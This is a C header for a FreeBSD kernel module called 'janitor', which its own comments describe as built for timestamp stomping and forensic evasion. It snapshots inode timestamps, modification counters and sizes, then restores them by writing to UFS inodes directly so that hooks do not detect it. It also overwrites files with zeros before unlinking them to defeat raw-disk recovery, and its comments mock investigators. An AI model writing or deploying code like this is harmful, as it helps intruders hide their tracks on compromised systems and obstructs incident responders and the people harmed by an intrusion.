#ifndef JANITOR_H
#define JANITOR_H

#include <sys/param.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/namei.h>
#include <sys/vnode.h>
#include <sys/mount.h>
#include <sys/malloc.h>
#include <sys/uio.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/syscallsubr.h>
#include <sys/libkern.h>

#include "common.h"

// janitor is for time stomping and basic time forensics evasion.
// targets ufs inode directly instead of regular freebsd timestomping instead of syscall hooking because thats dtc
// use these to recover stuff

// take a saved copy of a ufs inode
// fs object snapshot
// CURRENTLY SUPPORTS UFS FOR SPECIAL TRICK IHAD, AND EVEYRTHING ELSE (see janitor_vfs.h)
struct janitor_snap {
	struct timespec atime;
	struct timespec mtime;
	struct timespec ctime;
	uint64_t modrev;
	off_t size;
};

#include "janitor_ufs.h"
#include "janitor_vfs.h"

// resolve a path, lock vnode, and lookup ufs inode
// vpp, ipp ptrs required for use
static
int janitor_lock (const char* path, struct vnode ** vpp, struct nameidata * ndp)
{
	NDINIT(ndp, LOOKUP, FOLLOW, UIO_SYSSPACE, path);
	int error = namei(ndp);
	if (error!=0)
		return (error);
	NDFREE_PNBUF(ndp);
	struct vnode * vp = ndp->ni_vp;
	error = vn_lock(vp, LK_EXCLUSIVE|LK_RETRY);
	if (error!=0) {
		vput(vp);
		return (error);
	}
	*vpp = vp;
	return (0);
}


// is this ufs?
static
int janitor_is_ufs (struct vnode * vp)
{
	return (vp->v_mount!=NULL && strcmp(vp->v_mount->mnt_stat.f_fstypename, "ufs")==0);
}

// captuer atime/mtime/ctime, modrev and sz against target inode
static __unused
int janitor_snapshot (const char* path, struct janitor_snap * snap)
{
	struct nameidata nd;
	struct vnode * vp = NULL;
	int error = janitor_lock(path, &vp, &nd);

	if (error!=0)
		return (error);
	if (janitor_is_ufs(vp))
		error = janitor_ufs_snapshot(vp, snap);
	else
		error = janitor_vfs_snapshot(vp, snap);
	VOP_UNLOCK(vp);
	vput(vp);
	return (error);
}

static
int janitor_restore_times (const char* path, const struct janitor_snap * snap)
{
	struct nameidata nd;
	struct vnode * vp = NULL;
	int error = janitor_lock(path, &vp, &nd);

	if (error!=0)
		return (error);
	if (janitor_is_ufs(vp))
		error = janitor_ufs_restore_times(vp, snap);
	else
		error = janitor_vfs_restore_times(vp, snap);
	VOP_UNLOCK(vp);
	vput(vp);
	return (error);
}

static __unused
int janitor_restore (const char* path, const struct janitor_snap * snap)
{
	struct nameidata nd;
	struct vnode * vp = NULL;
	int error = janitor_lock(path, &vp, &nd);

	if (error!=0)
		return (error);
	if (janitor_is_ufs(vp))
		error = janitor_ufs_restore(vp, snap);
	else
		error = janitor_vfs_restore(vp, snap);
	VOP_UNLOCK(vp);
	vput(vp);
	return (error);
}

/// scrub a file with null bytes befoer unlinking it i know some dudes gonna try and read raw disk
// thinking hes so smart FUCK you buddy you aint ud no mo
static
int janitor_scrub_file (const char* path)
{
	struct stat sb;
	// alright this path is ok 
	int error = kern_statat(curthread, 0, AT_FDCWD, path, UIO_SYSSPACE, &sb);
	if (error!=0) return (error);
	// to be fair this could be some sort of detection oracle 
	// i dont really care 
	void* zero = malloc(PAGE_SIZE, M_TEMP, M_WAITOK|M_ZERO);

	if (zero==NULL) return (ENOMEM);
	
	error = kern_openat(curthread, AT_FDCWD, path, UIO_SYSSPACE, O_WRONLY, 0);

	if (error != 0) {
		free(zero, M_TEMP);
		return (error);
	}
	struct thread * td = curthread;

	int fd = td->td_retval[0];

	for (off_t off=0; off<sb.st_size; off += MIN((off_t)PAGE_SIZE, sb.st_size-off)) {

		size len = MIN((off_t)PAGE_SIZE, sb.st_size-off);

		struct iovec iov = { 
			.iov_base = zero, 
			.iov_len = len 
		};

		struct uio uio = { 
			.uio_iov = &iov, 
			.uio_iovcnt = 1,
		    .uio_offset = off, 
			.uio_resid = len,
		    .uio_segflg = UIO_SYSSPACE, 
			.uio_rw = UIO_WRITE,
		    .uio_td = td
		 };

		error = kern_pwritev(td, fd, &uio, off);
		if (error != 0) break;
	}
	kern_close(td, fd);
	free(zero, M_TEMP);
	return (error);
}

// unlink path w/o going thru fd
static
int janitor_unlink (const char* path)
{
	// is this detected idk
	return (kern_funlinkat(curthread, AT_FDCWD, path, FD_NONE,
	    UIO_SYSSPACE, 0, 0));
}

// scrub then unlink
static __unused
int janitor_scrub_unlink (const char* path)
{
	int error = janitor_scrub_file(path);

	(void)janitor_unlink(path);
	return (error);
}

#endif
